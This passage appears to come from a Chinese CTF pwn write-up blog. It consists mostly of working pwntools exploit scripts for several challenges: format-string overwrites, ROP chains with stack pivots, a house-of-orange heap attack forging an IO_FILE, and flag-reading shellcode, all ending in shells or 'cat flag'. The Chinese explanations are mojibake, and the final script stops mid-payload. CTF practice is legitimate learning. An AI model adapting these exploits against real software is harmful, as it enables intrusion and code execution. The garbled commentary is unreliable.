payload=b&amp;quot;\x00&amp;quot;*0x100+b&amp;quot;\x40\x81&amp;quot;
edit(payload)
save()
pf()

sleep(1)


leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x21a780
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
pop_rdi=leak_addr+0x2a3e5
pop_rsp=leak_addr+0x35732
ret=leak_addr+0xf8098
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]


#leak stack_addr
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(environ)
edit(payload)
save()
pf()

sleep(1)


stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
begin_addr=stack_addr-0x238
print(&amp;quot;begin_addr: &amp;quot;,hex(begin_addr))
ret_addr=begin_addr+0x118
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
canary_addr=stack_addr-0x130
print(&amp;quot;canary_addr: &amp;quot;,hex(canary_addr))


#leak canary
payload=b&amp;quot;\x00&amp;quot;*0x100+p64(canary_addr+1)
edit(payload)
save()
pf()

sleep(1)

canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;,hex(canary))
shell=leak_addr+0xebdb3


#fmt 1
payload=fmtstr_payload(10,{ret_addr+0x8:p64(pop_rdi)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 2
payload=fmtstr_payload(10,{ret_addr+0x10:p64(str_sh)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 3
payload=fmtstr_payload(10,{ret_addr+0x18:p64(sys_addr)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()
sleep(1)

#fmt 4
payload=fmtstr_payload(10,{ret_addr:p64(ret)},write_size=&#39;short&#39;)
payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(begin_addr)
edit(payload)
save()
pf()

exit()

io.interactive()
# 0x50a37 posix_spawn(rsp+0x1c, &amp;quot;/bin/sh&amp;quot;, 0, rbp, rsp+0x60, environ)
# constraints:
# rsp &amp;amp; 0xf == 0
# rcx == NULL
# rbp == NULL || (u16)[rbp] == NULL
# 0xebcf1 execve(&amp;quot;/bin/sh&amp;quot;, r10, [rbp-0x70])
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebcf5 execve(&amp;quot;/bin/sh&amp;quot;, r10, rdx)
# constraints:
# address rbp-0x78 is writable
# [r10] == NULL || r10 == NULL
# [rdx] == NULL || rdx == NULL
# 0xebcf8 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
# address rbp-0x78 is writable
# [rsi] == NULL || rsi == NULL
# [rdx] == NULL || rdx == NULL
# 0xebd52 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, r12)
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [r12] == NULL || r12 == NULL
# 0xebdaf execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x48 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
# 0xebdb3 execve(&amp;quot;/bin/sh&amp;quot;, rbp-0x50, [rbp-0x70])
# constraints:
# address rbp-0x50 is writable
# [rbp-0x50] == NULL || rbp-0x50 == NULL
# [[rbp-0x70]] == NULL || [rbp-0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame_2023_lenlim-shellcode-ora&#34;&gt;0xGame_2023_lenlim-shellcode-ora&lt;/h3&gt;
&lt;p&gt;‰æß‰ø°ÈÅìÁàÜÁ†¥flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
# elf=ELF(&amp;quot;./pwn&amp;quot;)


read_shellcode=asm(&#39;&#39;&#39;
    mov edi,0
    push 0x2023000d
    pop rsi
    syscall              
&#39;&#39;&#39;)


def exp(dis,char):
    shellcode = asm(&#39;&#39;&#39;
            push   0x67616c66
            push   0x2
            pop    rax
            mov    rdi,rsp
            xor    rsi,rsi
            syscall 

            mov    rdi,rax
            xor    rax,rax
            mov    rsi,0x20230300
            push   0x50
            pop    rdx
            syscall 
            
            mov dl, byte ptr [rsi+{}]
            mov cl, {}
            cmp cl,dl
            jz loop
            mov al,60
            syscall
            loop:
            jmp loop
            &#39;&#39;&#39;.format(dis,char))
    io.send(shellcode)
flag = &amp;quot;0xGame{N0_SHELLCODE_NEXT_TIME_PLZ&amp;quot;

for i in range(len(flag),50):
    sleep(1)
    log.success(&amp;quot;flag : {}&amp;quot;.format(flag))
    for j in range(0x20,0x80):
        # io = process(&#39;./pwn&#39;)
        io=remote(&amp;quot;8.130.35.16&amp;quot;,54000)
        try:
            payload=read_shellcode
            io.sendafter(b&amp;quot;code:\n&amp;quot;,payload)
            io.recvuntil(b&amp;quot;machanism...\n&amp;quot;)
            exp(i,j)
            io.recvline(timeout=1)
            flag += chr(j)
            io.send(&#39;\n&#39;)
            log.success(&amp;quot;{} pos : {} success&amp;quot;.format(i,chr(j)))
            io.close()
            break
        except:           
            io.close()


# io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar2023_week5_no_output&#34;&gt;newstar2023_week5_no_output:&lt;/h3&gt;
&lt;p&gt;Ê∑ÄÁ≤âÊûÅÂÆ¢linkmapÂº±ÂåñÁâàÔºålinkmapÈÇ£ÈÅìÂæóËá™Â∑±ÊâægadgetÔºåËøôÈÅìÈ¢òÁõ¥Êé•ÊäälibcÂú∞ÂùÄÂÜôbssÊÆµ‰∏ä‰∫ÜÔºåÁõ¥Êé•&lt;code&gt;partial write&lt;/code&gt;ÊîπwriteÔºåÊèêÂâçÂ∏ÉÁΩÆÂ•ΩÂØÑÂ≠òÂô®È°∫Â∏¶Ê†àËøÅÁßªËøáÂéªÊ≥ÑÈú≤Â∞±ÂèØ‰ª•‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,27515)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401253
pop_rsi_r15=0x401251
pop_rbp=0x40112d
a_addr=0x404050
bss_addr=0x404800
read_text=0x4011c1
read_plt=elf.plt[b&amp;quot;read&amp;quot;]
leave_ret=0x4011ea


# gdb.attach(io)
# pause()

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr+8)*2+p64(read_plt)
io.send(payload)

sleep(0.5)

payload=p64(pop_rdi)+p64(0)+p64(pop_rsi_r15)+p64(bss_addr+0x400)*2+p64(read_plt)+p64(pop_rbp)+p64(bss_addr+0x400-0x8)+p64(leave_ret)
io.send(payload)

sleep(0.5)

payload=b&amp;quot;\x00&amp;quot;*0x70+p64(a_addr+0x50)+p64(pop_rsi_r15)+p64(a_addr)*2+p64(read_plt)+p64(pop_rsi_r15)+p64(elf.got[b&amp;quot;read&amp;quot;])*2+p64(pop_rdi)+p64(1)+p64(pop_rbp)+p64(0x404050-0x8)+p64(leave_ret)
io.send(payload)

# gdb.attach(io)
# pause()

io.send(b&amp;quot;\x60\x30&amp;quot;)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;read&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=p64(pop_rdi)+p64(str_sh)+p64(sys_addr)
io.send(payload)



io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011ea : leave ; ret
# 0x000000000040124c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401250 : pop r14 ; pop r15 ; ret
# 0x0000000000401252 : pop r15 ; ret
# 0x000000000040124b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040124f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040112d : pop rbp ; ret
# 0x0000000000401253 : pop rdi ; ret
# 0x0000000000401251 : pop rsi ; pop r15 ; ret
# 0x000000000040124d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;newstar_week5_planet&#34;&gt;newstar_week5_planet:&lt;/h3&gt;
&lt;p&gt;ËøôÈÅìÈ¢òÊúâÂèØ‰ª•‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÁöÑÂêéÈó®ÂáΩÊï∞Ôºå‰ΩÜÊòØÊàë‰ª¨ÈúÄË¶ÅÁªïËøáÈ™åËØÅÊâçËÉΩËøõÂÖ•&lt;br&gt;
ËøôÈáåÊàë‰ª¨Áõ¥Êé•ÊääÈ™åËØÅÈáåÈù¢ÁîüÊàêÈöèÊú∫Â≠óÁ¨¶‰∏≤ÊâÄÂºïÁî®ÁöÑÈÇ£‰∏Ä‰∏≤asciiÂ≠óÁ¨¶Ë°®ÂÖ®ÈÉ®Ë¶ÜÁõñ‰∏∫1Âç≥ÂèØ&lt;br&gt;
Êú¨Êù•week5ËøòÊúâ‰∏ÄÈÅìpinÁ†Å‰æß‰ø°ÈÅìÁöÑÔºåÂ∞±ÊòØ‰ªäÂπ¥ÂõΩËµõlojinÁöÑÂº±ÂåñÁâàÔºåÁΩë‰∏ä‰∏ÄÊêúÂ∞±ÊúâËÑöÊú¨ÁöÑÔºåÈÇ£‰∏™8‰ΩçËøô‰∏™Âè™Êúâ6‰ΩçÔºå‰ΩÜÊòØÁΩëÁªúÁéØÂ¢ÉÊå∫ÊäΩË±°ÁöÑÔºåÈöæÁª∑Ôºå‰∏çÊîæ‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25518)
elf=ELF(&amp;quot;./pwn&amp;quot;)

def Jump():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Jump&amp;quot;)
    
def GetName():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GetName&amp;quot;)
    
def Rename(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Rename&amp;quot;)
    io.sendlineafter(b&amp;quot;name\n&amp;quot;,cc)
    
def GoBack(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;GoBack&amp;quot;)
    io.sendline(cc)
    
def Check():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Check&amp;quot;)
    
def Search():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Search&amp;quot;)
    
def Nap():
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Nap&amp;quot;)
    
def Admin(cc):
    io.sendlineafter(b&amp;quot;\n&amp;gt;&amp;quot;,b&amp;quot;Admin&amp;quot;)
    io.sendlineafter(b&amp;quot;passwd\n&amp;gt; &amp;quot;,cc)
    

psss=b&amp;quot;secret_passwd_anti_bad_guys&amp;quot;


# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;Passwd: &amp;quot;,psss)

Nap()
# for i in range(11):
#     Nap()
#     Jump()

GetName()
Rename(b&amp;quot;a&amp;quot;*0x10)
GetName()

io.recvuntil(b&amp;quot;a&amp;quot;*0x10)
abcd_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))+0x10
print(&amp;quot;abcd_addr: &amp;quot;,hex(abcd_addr))    


sleep(1)
GetName()
Rename(b&amp;quot;b&amp;quot;*0x18+p64(abcd_addr))
Jump()
GetName()
Rename(b&amp;quot;1&amp;quot;*0x21)

Admin(b&amp;quot;1&amp;quot;*0x1e)


io.sendlineafter(b&amp;quot;exec\n&amp;gt; &amp;quot;,b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;axb_ezheap&#34;&gt;axb_ezheap:&lt;/h3&gt;
&lt;p&gt;ÂΩìÊó∂Áõ¥Êé•Ë∑≥Ëøáhouse of orangeÂéªÁúãhouse of apple...&lt;br&gt;
Ê≠§È¢òGLIBC 2.23 11.03Ôºåhouse of orangeÁöÑÊ®°ÊùøÈ¢ò&lt;br&gt;
È¢òÁõÆÊúÄÂºÄÂßãÁªôÂá∫Â†ÜÂú∞ÂùÄ&lt;br&gt;
ÈÄöËøá1Ê¨°add‰πãÂêéÁöÑÂ†ÜÊ∫¢Âá∫ÂÜô‰øÆÊîπ&lt;code&gt;top chunk&lt;/code&gt;ÔºåÈúÄË¶ÅÊ≥®ÊÑèÂÜÖÂ≠òÈ°µÂØπÈΩêÔºå&lt;code&gt;prev_inuse=1&lt;/code&gt;&lt;br&gt;
ÂÜçadd‰∏ÄÊ¨°Â§ßÁöÑÁî≥ËØ∑Âá∫‰øÆÊîπËøáÂêéÁöÑ&lt;code&gt;old top chunk&lt;/code&gt;ËøõÂÖ•&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
ÂÜçÈÄöËøáaddÁî≥ËØ∑Âà∞&lt;code&gt;unsorted bin&lt;/code&gt;‰ª•Ê≠§Ê≥ÑÈú≤libc&lt;br&gt;
‰πãÂêé‰º™ÈÄ†&lt;code&gt;IO_FILE&lt;/code&gt;ÁªìÊûÑ‰ΩìÔºå2.23ÂèØ‰ª•ÂØπ&lt;code&gt;vtable&lt;/code&gt;Êó†Ê£ÄÊü•Ôºå&lt;code&gt;vtable&lt;/code&gt;‰º™ÈÄ†Âà∞ÂèØÊéßÂ†ÜÂú∞ÂùÄÂç≥ÂèØ&lt;br&gt;
ÁÑ∂Âêé‰øùËØÅ&lt;code&gt;‰º™ÈÄ†Âà∞ÁöÑÂú∞ÂùÄ+0x18&lt;/code&gt;Â§Ñ‰πüÂèØÊéßÔºåÂç≥&lt;code&gt;vtable[3]&lt;/code&gt;ÂèØÊéßÔºåÊ≠§Â§ÑÊòØ&lt;code&gt;__overflow&lt;/code&gt;Ôºå‰øÆÊîπ‰∏∫&lt;code&gt;system&lt;/code&gt;Âú∞ÂùÄ&lt;br&gt;
‰øÆÊîπ&lt;code&gt;unsorted bin&lt;/code&gt; bk‰∏∫&lt;code&gt;_IO_list_all-0x10&lt;/code&gt;,ÂêéÈù¢&lt;code&gt;unsorted bin attack&lt;/code&gt;ÂêéÂÜçÂàÜÈÖç‰∏Ä‰∏™Â†ÜÂùóÔºåÂà©Áî®&lt;code&gt;_chain&lt;/code&gt;Ê†áÂøó‰ΩçÔºåÊ≠§Ê†áÂøó‰ΩçÊ≠£Â•Ω‰Ωç‰∫é&lt;code&gt;_IO_FILE&lt;/code&gt;ÁªìÊûÑ‰Ωì0x60Â§ÑÔºåÊåáÂêë‰∏ã‰∏Ä‰∏™Êñá‰ª∂ÊµÅÔºåÊ∫¢Âá∫ÂÜô&lt;code&gt;unsorted bin&lt;/code&gt; size‰∏∫&lt;code&gt;0x61&lt;/code&gt;Ôºå Â±û‰∫é &lt;code&gt;smallbin&lt;/code&gt;ÔºåËøô‰∏™Â§ßÂ∞èÁöÑ &lt;code&gt;smallbin&lt;/code&gt; Áõ∏ÂØπ &lt;code&gt;unsorted bin&lt;/code&gt; ÁöÑÂÅèÁßªÔºå‰∏é &lt;code&gt;_chain&lt;/code&gt; Áõ∏ÂØπ &lt;code&gt;_IO_list_all&lt;/code&gt; ÁöÑÂÅèÁßªÊòØ‰∏ÄÊ†∑ÁöÑ,‰ΩøÂæó&lt;code&gt;_IO_list_all&lt;/code&gt;ÊåáÂêë&lt;code&gt;unsorted bin&lt;/code&gt;&lt;br&gt;
ËÄå‰øÆÊîπÂêéÁöÑ&lt;code&gt;unsorted bin&lt;/code&gt;ÂÜçÊ¨°mallocÊó∂‰ºöÊä•ÈîôÔºåË∑ØÂæÑÂ¶Ç‰∏ã&lt;br&gt;
&lt;code&gt;malloc-&amp;gt;_int_malloc-&amp;gt;__libc_message-&amp;gt;abort-&amp;gt;_IO_flush_all_lockp&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_flush_all_lockp&lt;/code&gt;ÈÅçÂéÜÊñá‰ª∂ÊµÅÔºåÊä•ÈîôÂ§ÑÁêÜ &lt;code&gt;_chain&lt;/code&gt; ÊåáÂêëÁöÑ‰∏ã‰∏Ä‰∏™Êñá‰ª∂ÊµÅÔºåÊâÄ‰ª•Âà©Áî®&lt;code&gt;unsorted bin&lt;/code&gt;‰º™ÈÄ†&lt;code&gt;IO_FILE&lt;/code&gt;ÁªìÊûÑ‰Ωì&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28437)
elf=ELF(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;Name?\n&amp;quot;,cc)

def edit(s,cc):
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;2&amp;quot;)
    io.sendlineafter(&amp;quot;it\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)

def show():
    io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;3&amp;quot;)
    
# gdb.attach(io.pid)
# pause()

heap_addr=int(io.recvline(),16)-0x10
print(&amp;quot;heap_addr:&amp;quot;,hex(heap_addr))

add(0x68,b&amp;quot;a&amp;quot;)
edit(0x6f,b&amp;quot;\x00&amp;quot;*0x68+b&amp;quot;\x71\x0f\x00&amp;quot;)

add(0xf70,b&amp;quot;a&amp;quot;)

add(0x80,b&amp;quot;a&amp;quot;*8)
show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x3c5188
print(&amp;quot;leak_addr:&amp;quot;,hex(leak_addr))

_IO_list_all=leak_addr+libc.sym[b&amp;quot;_IO_list_all&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
fake_vtable=heap_addr+0x268


add(0x68,b&amp;quot;asd&amp;quot;)

padding=b&amp;quot;a&amp;quot;*0x60

fakefile=b&amp;quot;/bin/sh\x00&amp;quot;+p64(0x61) #_flags -&amp;gt; /bin/sh
fakefile+=p64(0)+p64(_IO_list_all-0x10) #bk-&amp;gt; _IO_list_all-0x10
fakefile+=p64(0)+p64(1)
fakefile=fakefile.ljust(0xc0,b&amp;quot;\x00&amp;quot;)
fakefile+=p64(0)*3
fakefile+=p64(fake_vtable)+p64(0)*2+p64(sys_addr) # fake_vtable+0x18 (vtable[3]) -&amp;gt; &amp;amp;sys_addr

padding+=fakefile

edit(len(padding),padding)

io.sendlineafter(&amp;quot;choice : &amp;quot;,&amp;quot;1&amp;quot;)

gdb.attach(io.pid)
pause()

io.sendlineafter(&amp;quot;it\n&amp;quot;,b&amp;quot;1&amp;quot;) #local

# io.sendlineafter(&amp;quot;it\n&amp;quot;,str(0x100)) #remote

# io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;yukkurisay&#34;&gt;YukkuriSay&lt;/h3&gt;
&lt;p&gt;Âæ™ÁéØÂÜÖËæìÂÖ•Ê≥ÑÈú≤Ê†àÂú∞ÂùÄÂíålibc&lt;br&gt;
ÊúÄÂêé‰∏ÄÊ¨°Âæ™ÁéØÂÜÖÂ∏ÉÁΩÆË∑≥Êùø&lt;br&gt;
Âæ™ÁéØÂ§ñÊúâ‰∏ÄÊ¨°Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÁöÑÊú∫‰ºöÔºåÂèØ‰ª•Âà©Áî®ÂàöÊâçÊàë‰ª¨Â∏ÉÁΩÆÁöÑË∑≥Êùø‰øÆÊîπ&lt;code&gt;printf&lt;/code&gt;ÁöÑgotË°®‰∏∫&lt;code&gt;sys_addr&lt;/code&gt;‰ª•Âèä‰øÆÊîπ&lt;code&gt;ret_addr&lt;/code&gt;ÂÜç‰∏ÄÊ¨°ËæìÂÖ•&lt;code&gt;/bin/sh\x00&lt;/code&gt;Êù•&lt;code&gt;getshell&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28513)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=elf.libc


io.sendafter(b&amp;quot;say?\n&amp;quot;,cyclic(0x98))

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;_IO_2_1_stderr_&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

pop_rdi=leak_addr+0x23b6a 
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92
ret=leak_addr+0x142c92
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
shell=leak_addr+0xe3b01

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
io.send(b&amp;quot;b&amp;quot;*0xff+b&amp;quot;.&amp;quot;)

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
ret_addr=stack_addr-0x8
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;y&amp;quot;)
payload=p64(elf.got[b&amp;quot;printf&amp;quot;])
payload+=p64(ret_addr)
payload+=p64(ret_addr+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+1)
payload+=p64(elf.got[b&amp;quot;printf&amp;quot;]+2)

io.send(payload)

s1=sys_addr&amp;amp;0xff
s2=(sys_addr&amp;gt;&amp;gt;8)&amp;amp;0xff
s3=(sys_addr&amp;gt;&amp;gt;16)&amp;amp;0xff
gift1=0x401678&amp;amp;0xff
gift2=(0x401678&amp;gt;&amp;gt;8)&amp;amp;0xff

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;/n)\n&amp;quot;,b&amp;quot;n&amp;quot;)

payload=&amp;quot;%{}c%{}$hhn&amp;quot;.format(s1,8) #Â∏ÉÁΩÆË∑≥ÊùøÂú®Ê†à‰∏äÂÅèÁßª‰∏∫8
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift1-s1,9) #Èò≤Ê≠¢Ë¢´ÂáèÊï∞Â∞è‰∫éÂáèÊï∞ÁöÑÊÉÖÂÜµÂèëÁîü
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+gift2-gift1,10)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s2-gift2,11)
payload+=&amp;quot;%{}c%{}$hhn&amp;quot;.format(0x100+s3-s2,12)
io.sendafter(b&amp;quot;: \n&amp;quot;,payload)

sleep(1)

io.send(b&amp;quot;/bin/sh\x00&amp;quot;)


io.interactive()

# 0xe3afe execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;Ë•øÊπñËÆ∫Ââë_babycalc&#34;&gt;Ë•øÊπñËÆ∫Ââë_babycalc:&lt;/h3&gt;
&lt;p&gt;Ê≤°ÊúâÊ∫¢Âá∫&lt;br&gt;
z3Ëß£ÊñπÁ®ãÔºåÂ∞ÜËß£Âá∫ÁöÑÂÄºÊîæÂÖ•ÂØπÂ∫î‰ΩçÁΩÆÂç≥ÂèØ&lt;br&gt;
È¶ñÂÖàÂ≠òÂú®rbpÂ≠òÂú®‰∏Ä‰∏™&lt;code&gt;off_by_one&lt;/code&gt;ÔºåÂèØ‰ª•ÊîπÂÜôrbp‰Ωé1Â≠óËäÇÔºå‰ΩøÂæórbpÂèØ‰ª•ÊåáÂêëÊàë‰ª¨ÂèØÊéßÊ†àÂå∫(Ê¶ÇÁéá)&lt;/p&gt;
&lt;p&gt;ÂÖ∂Ê¨°Â≠òÂú®‰∏Ä‰∏™&lt;code&gt;var_38[idx]=iVar1&lt;/code&gt;Ôºå&lt;code&gt;idx&lt;/code&gt;‰∏∫Êàë‰ª¨ÂèØÊéßÂ≠óÊÆµÔºåÂç≥Âæ™ÁéØÁöÑ&lt;code&gt;i&lt;/code&gt;ÂÄºÔºå&lt;code&gt;iVar1&lt;/code&gt;‰πüÂèØÊéß,Êàë‰ª¨ÊúÄÂºÄÂßãËæìÂÖ•ÁöÑ16ËøõÂà∂ÂÄºÈÄöËøá&lt;code&gt;strtol&lt;/code&gt;ËΩ¨Âåñ‰∏∫&lt;code&gt;iVar1&lt;/code&gt;&lt;br&gt;
ÂèØ‰ª•ÂÜô‰∏ÄÂ≠óËäÇ‰Ωøret‰Ωé‰∏ÄÂ≠óËäÇ‰∏∫&lt;code&gt;0x18&lt;/code&gt;‰ΩøÂæóÂÖ∂Âèò‰∏∫&lt;code&gt;leave; ret&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Âú®ÂèØÊéßÊ†àÂå∫Êàë‰ª¨ÂèØ‰ª•ÊîæÂÖ•Â§ßÈáè&lt;code&gt;ret&lt;/code&gt;ÂÖÖÂΩì&lt;code&gt;sled&lt;/code&gt;ÔºåÁÑ∂ÂêéÊîæÂÖ•ropÈìæÔºåÊúÄÂêéÂ∞±ÂèØ‰ª•Ê†àËøÅÁßªÂà∞Êàë‰ª¨ÁöÑÂèØÊéßÊ†àÂå∫ÊâßË°åropÈìæ&lt;/p&gt;
&lt;p&gt;Á¨¨‰∏ÄÊ¨°Êàë‰ª¨Ê≥ÑÈú≤libcÔºåÁ¨¨‰∫åÊ¨°Â∞±ÂèØ‰ª•getshell&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28769)
# io=process(&amp;quot;./babycalc&amp;quot;)
elf=ELF(&amp;quot;./babycalc&amp;quot;)
libc=elf.libc

bss_addr=0x6024E0
pop_rdi=0x400ca3
ret=0x4005b9
start=0x400650

payload1=str(0x18).encode().ljust(8,b&amp;quot;\x00&amp;quot;)+p64(ret)*21+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.sym[&#39;puts&#39;])+p64(start)
#   0x18 to change rbp+0x8 low 1 byte
payload2=p8(0x13)+p8(0x24)+p8(0x35)+p8(0x46)+p8(55)+p8(66)+p8(17)+p8(161)+p8(50)+p8(131)+p8(212)+p8(101)+p8(118)+p8(199)+p8(24)+p8(3)
